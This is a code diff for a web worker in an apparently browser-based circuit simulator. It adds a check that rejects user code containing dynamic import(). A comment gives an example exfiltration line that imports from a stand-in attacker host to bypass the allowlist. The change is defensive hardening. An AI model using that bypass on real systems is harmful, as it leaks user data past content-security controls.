@@ -29,7 +29,7 @@
 import { executeCircuitCode, executeJsCode, stripTypes, getAllCircuitEvals } from '@simten/core/circuit';
 import { simulateCircuit } from '@simten/core/api';
 import type { Circuit } from '@simten/core';
-import { hasImportStatements, extractAndRewriteImports } from './rewrite-imports.js';
+import { hasImportStatements, extractAndRewriteImports, containsDynamicImport } from './rewrite-imports.js';
 
 /**
  * Extract all registered evals as source strings (via fn.toString()) so they can
@@ -69,6 +69,19 @@ async function handleRequest(req: WorkerRequest): Promise<void> {
   if (req.type === 'compile') {
     try {
       const js = stripTypes(req.source);
+
+      // Reject dynamic import() — the static-import rewriter doesn't touch it,
+      // so without this gate `await import('https://attacker.example/?leak=…')`
+      // bypasses our esm.sh allowlist (connect-src doesn't govern import()).
+      // See containsDynamicImport in rewrite-imports.ts for full rationale.
+      if (containsDynamicImport(js)) {
+        self.postMessage({
+          id: req.id,
+          type: 'error',
+          error: "Dynamic import() is not allowed in circuit code. Use a static `import` statement at the top of the file instead.",
+        });
+        return;
+      }
 
       let result;
       if (!hasImportStatements(js)) {
